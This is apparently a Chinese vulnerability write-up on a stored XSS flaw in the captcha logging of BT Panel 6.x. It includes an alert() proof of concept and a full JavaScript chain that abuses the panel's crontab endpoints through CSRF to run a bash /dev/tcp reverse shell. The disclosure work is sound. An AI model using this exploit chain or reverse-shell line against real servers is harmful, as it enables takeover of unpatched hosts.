@@ -1,0 +1,83 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="96477c965b8c4cca2c6e4471019ec703">【前言】</h1>
+<p>什么是宝塔面板？</p>
+<p>宝塔面板是一款使用方便、功能强大且终身免费的服务器管理软件,支持Linux与Windows系统。一键配置:LAMP/LNMP、网站、数据库、FTP、SSL,通过Web端轻松管理服务器。推出至今备受中小站点站长喜爱，下载量过百万。</p>
+<h1 data-content="1" id="feab53212919f20b52fa11ace3f385e2">【漏洞代码分析】</h1>
+<p>在6.x linux版本宝塔面板当中当中，相对与5.x版本，记录了验证码错误并存入数据库当中，存储xss缺陷就是在此处产生。</p>
+<p>我们直接看漏洞代码。<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110609104222.png"/><br/>
+直接分析post请求部分。<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607363249.png"/><br/>
+代码如下：<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607402651.png"/></p>
+<p>我们可以看到这里首先判断了是否有 用户名密码，然后是验证码。判断这个IP是否是有登陆失败的记录。如果大于1  记录一下，随后将错误次数大于1的用户名的和密码都进行了记录。<br/>
+从数据库中读取管理员账号密码。进行对比。如果没有成功就返回一个错误</p>
+<p>关键的代码如下：<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607440019.png"/></p>
+<p>此处记录了一下post 的请求。然后将code传入到了写日志的一个函数里面。追踪一下这个函数。 在public.py 里面，找到如下函数<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607454392.png"/></p>
+<p>这里就是一个写日志的功能。定义了一个teyp 然后是args  。这里把code 传递过来。就直接写入了日志。没有做任何过滤处理。然后就导致了xss漏洞产生。<br/>
+可以在宝塔数据库当中，看到logs数据库里存储的信息<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110608484977.png"/></p>
+<h1 data-content="1" id="b03afbb6749bf815aea621148ab7159c">【漏洞复现】</h1>
+<p>我们直接在面板登录处，随便输入一个账号密码，触发失败，要求输入验证码。<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607503033.jpg"/><br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607514553.png"/></p>
+<p>由于没有任何过滤处理，我们直接输入弹窗的payload：&lt;script&gt;alert('www.dafsec.org')&lt;/script&gt;</p>
+<p><img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607541532.png"/></p>
+<p>登录后台后，打开安全模块，成功触发弹窗。<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110607590410.png"/></p>
+<p>由于服务器管理面板的特殊性，后台可以进行敏感操作。手写js远程调用，利用csrf漏洞在计划任务处配合存储xss，可成功反弹shell，弹shell成功截图如下：<br/>
+<img src="http://www.dafsec.org/wp-content/uploads/2018/11/2018110608401472.png"/></p>
+<p>远程调用的js代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">addTask</span><span class="p">(</span><span class="nx">TaskName</span><span class="p">,</span> <span class="nx">execTime</span><span class="p">,</span> <span class="nx">ip</span><span class="p">,</span> <span class="nx">port</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">execShell</span> <span class="o">=</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/your_ip/your_port 0&gt;&amp;1'</span><span class="p">;</span>
+    <span class="nx">execShell</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">execShell</span><span class="p">);</span>
+    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="s1">'name='</span> <span class="o">+</span> <span class="nx">TaskName</span> <span class="o">+</span> <span class="s1">'&amp;type=minute-n&amp;where1='</span> <span class="o">+</span> <span class="nx">execTime</span> <span class="o">+</span> <span class="s1">'&amp;hour=&amp;minute=&amp;week=&amp;sType=toShell&amp;sBody='</span> <span class="o">+</span> <span class="nx">execShell</span> <span class="o">+</span> <span class="s1">'&amp;sName=&amp;backupTo=localhost&amp;save=&amp;urladdress=undefined'</span>
+    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/crontab?action=AddCrontab'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">execTask</span><span class="p">(</span><span class="nx">TaskName</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/crontab?action=GetCrontab'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kd">var</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">name</span> <span class="o">==</span> <span class="nx">TaskName</span><span class="p">)</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">TaskID</span> <span class="o">=</span> <span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">id</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+                <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+                <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/crontab?action=StartTask'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+                <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">);</span>
+                <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="s1">'id='</span> <span class="o">+</span> <span class="nx">TaskID</span><span class="p">;</span>
+                <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+                <span class="nx">delTask</span><span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">id</span><span class="p">);</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">id</span><span class="p">);</span>
+                <span class="k">return</span> <span class="nx">res</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">id</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">delTask</span><span class="p">(</span><span class="nx">TaskID</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="s1">'id='</span> <span class="o">+</span> <span class="nx">TaskID</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'POST'</span><span class="p">,</span> <span class="s1">'/crontab?action=DelCrontab'</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">'Content-Type'</span><span class="p">,</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">);</span>
+    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">TaskName</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">substring</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span>
+<span class="nx">addTask</span><span class="p">(</span><span class="nx">TaskName</span><span class="p">,</span> <span class="s1">'5'</span><span class="p">,</span> <span class="s1">'1.1.1.1'</span><span class="p">,</span> <span class="s1">'53'</span><span class="p">);</span>
+<span class="nx">execTask</span><span class="p">(</span><span class="nx">TaskName</span><span class="p">);</span>
+</pre></div>
+<h1 data-content="1" id="5a3cdd7ef779d39eebc5ec755d139fb6">【后序】</h1>
+<p>宝塔官方已修复该漏洞，但仍有大量存在漏洞主机暴露于公网，请及时更新至最新版本。<br/>
+官方已修复该漏洞，漏洞环境可以将附件当中的test.py同名覆盖掉宝塔最新版的/www/server/panel/class/userlogin.py</p>
+<p><strong>嘤嘤嘤~打个小广告，DAF团队收人，pwn选手，web选手，一起打比赛挖洞技术交流~有意请投递简历至admin@dafsec.org</strong></p>
+</div>
+</div>
